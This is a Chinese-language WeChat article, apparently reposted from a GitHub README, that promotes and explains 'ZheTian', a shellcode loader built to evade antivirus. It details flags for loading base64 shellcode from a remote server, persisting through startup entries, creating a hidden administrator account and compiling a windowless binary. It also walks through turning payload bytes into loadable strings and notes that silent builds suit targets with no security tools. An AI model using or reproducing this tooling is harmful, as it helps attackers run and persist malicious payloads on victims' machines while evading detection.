> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0rQ7p7On6H_r5nVkZCdUQA)

**零基础学渗透，领取配套视频**

**#统统可白嫖#**

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSHyfzIicIMsib97kZfZEART3awLIBLCUTufSibfC1DXZotKfSvNs2Zr0MSUr7dEWIwsQiay1jwn5WXaOA/640?wx_fmt=png)

扫码找小助理白嫖渗透资料![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEEQwsVFyfJD70E9HmDELbPwumVMkXxnmgmwHklA5JxIWJlzcPao47a9cibAmp1zeZ5Hf8yEWZSFBg/640?wx_fmt=png)

**学习大佬的思路技巧**  

原文地址：https://github.com/yqcs/ZheTian

ZheTian 强大的远程加载和执行 ShellCode 工具，**免杀** shellcode **加载框架**
---------------------------------------------------------

**命令详解**
--------

-u string：从远程服务器加载 base64 混淆后的字节码。
----------------------------------

-r string：从本地文件内读。
------------------

-s string：读取无修改的原始文件，只能从本地加载。
-----------------------------

-m boolean：参数为 true 自动向启动项添加自启模块。
---------------------------------

-o boolean：向 userHome\tmp 目录输出一次性可执行文件，体积比主程序小了五六倍，同理砍去了其他功能，只保留了 ShellCode Loader
----------------------------------------------------------------------------------

-n string：向管理员组创建用户，-n 的参数即为账户，-p 的参数为密码。需以管理员身份运行
--------------------------------------------------

-c string：直接从命令行获取 base64 字符串。
------------------------------

如：ZheTian -c ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M==...
-----------------------------------------------------

**如果 releases 里下载的可执行程序被安全软件查杀了，请下载源码重新编译一份！·**

**新增命令 - o 详解：**

该命令主要是向用户目录下创建 tmp 文件夹，然后生产只包含 shellcode 的程序，体积小了五六倍，极致压缩，并且无任何回显。

由于 ShellCode 写死在了程序内，所以导致用一段时间就会被查杀。

注意使用该命令需填充 shellcode，同时拥有 go 环境。

搭配 - s、-u、-c、-r 其中的任意命令即可，如：ZheTian -s payload.c -o true

> **示例：**

Base64 **字符串方式加载：**
-------------------

原始 python 代码：

> buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75..."

只需提取数组中的 16 进制代码：

> \xfc\x48\x83\xe4\xf0\xe8\xc8\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75...

然后去除 \ x，得到：

> fc4883e4f0e8c88b52208b423c4801d0668178180b0275......

然后使用 base64 转码，得到：

> ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==

c、ruby 等同理，Java 之流的则是去除 ", 0x"。注意，是逗号空格 0x

> byte buf[] = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41};

获取到 base64 字符串之后可以选择放到远程服务器加载，使用 - u 命令即可。

也可以放到本地文件内，或者直接使用 - c 命令以命令行方式运行。

如：ZheTian.exe -c ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==

**原文件读取类型：**

使用 ZheTian -h 命令可查看支持的语言。推荐使用 Java、py、C 语言。

原文件无需进行任何修改即可直接加载，但是不支持放在远程服务器，只能通过本地 -s 命令读取，如： `ZheTian -s C:/Windows/Temp/payload.java`  

**图示操作过程**

先生成 64 位 shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSG4LR3vvXiaT427lkdrDYcvlgR00LeRDXiaA2AkkNsT8D8fnF1c4B5lBgr3FlJ1nZicXjV8Jrlr943jA/640?wx_fmt=png)

然后根据需要的命令进行修改 

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSG4LR3vvXiaT427lkdrDYcvlBACNwibCW5kflfb7stxQker3V1EfQpKku6Xexj57znM29LjXC5WJ3rQ/640?wx_fmt=png)

下面执行示例： 

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSG4LR3vvXiaT427lkdrDYcvlriaCJhQkKlwUacwxeYZRVSYu6qFsFs9uPXTb6RTVxDqZ5SuJA3RH91A/640?wx_fmt=png)

### **编译：**  

> go build -ldflags "-w -s" -o ZheTian.exe

可以使用

> go build -ldflags "-w -s -H windowsgui" -o ZheTian.exe

实现无窗口运行。

但是 360 偶尔会识别为恶意程序。如果目标机器无安全设备，可以尝试使用此命令打包，然后使用参数： -o true 实现写入启动项功能。

**带图标编译：**

先执行：go get github.com/akavel/rsrc

rsrc -manifest ZheTian.manifest -ico favicon.ico -o ZheTian.syso

再执行 go build -ldflags "-w -s" -o ZheTian.exe

更多介绍：https://blog.csdn.net/qq_38376348/article/details/108318880

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSG4LR3vvXiaT427lkdrDYcvlnE8naKnWiatbOJdXb6HUOD3SCKTthcECUDCm8Y6qrLA9jLCma6yqBAQ/640?wx_fmt=png)

**注意：**打包的时候需指定是 64 位还是 32 位。

默认会根据系统自动选择。

而在生成 payload shellcode 的时候也需要选择正确的位数，否则会加载失败。

使用 code 字节码加载时一定要使用 base64 加密，否则无法解析！！

声明：本公众号所分享内容仅用于网安爱好者之间的技术讨论，所有渗透及工具的使用都需获取授权，禁止用于违法途径，否则需自行承担，本公众号及作者不承担相应的后果.

@

**欢迎加我个人微信：zkaq99、**实时分享安全动态

* * *

**防丢失**

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8r6UDibLl3oFOu6cEZPryVrS6n7TfhmDVMfKfIfc7nicyXQ0r0CjPZxPIACeen4QF4fuLwsRBhzMw/640?wx_fmt=jpeg)

[

Burpsuite 在各场景下的抓包方法 (整理)

2021-08-11

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGxyQDNlLJqgCtl0uVbspVnw7mIx6WzWt0EyBfIZ4TEg0xoVhnq0aQ1C3LAwTjqkkBBQVuGCVmbbQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247530928&idx=1&sn=46ce72097822348cd6d17e2941e60db6&chksm=ebea309ddc9db98bece713fa8eec5b2c9f47cdfb5921c976319c555d627dcd3ec2dc1dee58b6&scene=21#wechat_redirect)

[

【精选】SRC 快速入门 + 上分小秘籍 + 实战指南

2021-07-26

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSG4hnDrcfyBr4yp6gXLibsXuBFUwfZlEFxK6tMHyUPcQlkWKhoafcKcoh8X6nw6O359kfhkHDYoLmg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247528604&idx=1&sn=5ab3a5b3eaf0c56fcdeabccadfdc6bde&chksm=ebea39b1dc9db0a71fa71d233709afdfd2e2e0483ded28cca42044eded300f1c7025bde1b37a&scene=21#wechat_redirect)

[

干货｜列了几种均能过安全狗的方法！

2021-07-01

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSG24NfnFAyvceedkicO9fPkUwQ9X1L8owPwAichgQibfKV9RPxFibr8ia1JmdjjyFSGlUu97qfecE9iczCQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524943&idx=1&sn=98644144a3c10bb068ec0f310dcc4958&chksm=ebea2b62dc9da2749321fce7ab28788ced08a2b496e0a45b06a5887b5aa457e48f7a66110301&scene=21#wechat_redirect)

[

巧用 FOFA 挖到你的第一个漏洞

2021-06-08

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEJumG6X6C1M75AVwnphgU4wO2tIdSFib6hV6m4GLica2XGIEP1ujeNm1WVia1S6wFOV4RBB13FoxXIw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521952&idx=1&sn=55ab0613e5a7ba79b78849b4d91451f6&chksm=ebeadf8ddc9d569bcc64e99414dcbe6878a0b2c9f5c057b30c4bbe465ba76fcaa64e66caa0c2&scene=21#wechat_redirect)

[

那些年的 Hvv 日记

2021-04-17

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFRZS6XmvwR7KNeLGxuk6C4NDAawNMNvfHW7iacLEa7nYTUTCDQrfQcvRdfShEKtv7W9DWSufrYKlQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247515246&idx=1&sn=b1a73a93f8ce9a5d51ce3bed4ada1e56&chksm=ebeaf543dc9d7c557c36881cccaaffad5312938ad0450dc1e4050de583523c2a27ba5ab3a469&scene=21#wechat_redirect)

[

一名大学生的黑客成长史到入狱的自述

2020-12-22

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGzeY0rLibT3cqh51icktS1tKjpxm4A8ib17UC35kYoXLiak8X7Ugtu2rW2BRth3X5vKickew16jMibak2A/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247502926&idx=1&sn=8750295399cdcc5e71918c30bb1a974f&chksm=ebea8563dc9d0c75cdf709d2d16fdbdf82abee64516f7a44347f40056969d1b4bc3a1eb2ab2e&scene=21#wechat_redirect)

[技术揭秘：如何分析菜刀是否包含后门？](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247496122&idx=1&sn=3f85b9e357f9cf3ea2497de34c523221&chksm=ebeab897dc9d3181e026ac971b5d17d4d5490298a4e0d8d00e39020892791f9cb171f621d444&scene=21#wechat_redirect)

[2020-10-23](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247496122&idx=1&sn=3f85b9e357f9cf3ea2497de34c523221&chksm=ebeab897dc9d3181e026ac971b5d17d4d5490298a4e0d8d00e39020892791f9cb171f621d444&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHhV4muTBk1V7CXJP0nAxEI1TIjU4mUV6z1jdoE73UtlCpTK64xKXquNXD8bHLGU8VZCjAFbxCcpw/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247496122&idx=1&sn=3f85b9e357f9cf3ea2497de34c523221&chksm=ebeab897dc9d3181e026ac971b5d17d4d5490298a4e0d8d00e39020892791f9cb171f621d444&scene=21#wechat_redirect)

**看到这里了，点个 “赞”、“再看” 吧**